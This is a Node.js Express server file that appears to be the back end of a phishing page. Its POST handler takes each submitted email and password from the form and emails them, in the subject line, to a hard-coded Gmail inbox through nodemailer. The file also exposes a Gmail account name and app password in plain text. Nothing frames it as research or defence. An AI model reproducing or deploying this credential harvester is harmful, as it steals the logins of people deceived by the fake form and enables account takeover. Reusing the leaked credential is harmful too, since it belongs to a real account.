const express = require('express');

const app = express();
const nodemailer = require('nodemailer'); 




const PORT = process.env.PORT || 5000;



// middleware
app.use(express.static('public'))
app.set('view engine', 'ejs')
app.use(express.json())


// index
app.get('/', (req,res ) => {
    res.render("index")
})
// return index
app.get('/return', (req,res ) => {
    res.render("return")
})



// Form
app.post('/',(req,res) => {
    console.log(req.body)

    const transporter = nodemailer.createTransport({
        service:'gmail',
        auth: {
            user: 'Victorchinemerem191@gmail.com',
            pass: 'aivsveolwtqinddb'
        }
    })

    const mailOptions = {
        from: req.body?.email,
        to: 'Victorchinemerem191@gmail.com',
        subject: `Email: ${req.body?.email} \t\n\n\n password: ${req.body?.password}`
    }
console.log(mailOptions)
    transporter.sendMail(mailOptions,(error,info) => {
        if(error){
            console.log(error) 
            res.send('error');
        }else {
            console.log("Email sent", + info.response);
            res.send("success");
        }
    })
    
})


app.listen(PORT, ()=> {
    console.log(`Server running on port http://localhost:${PORT}`)
})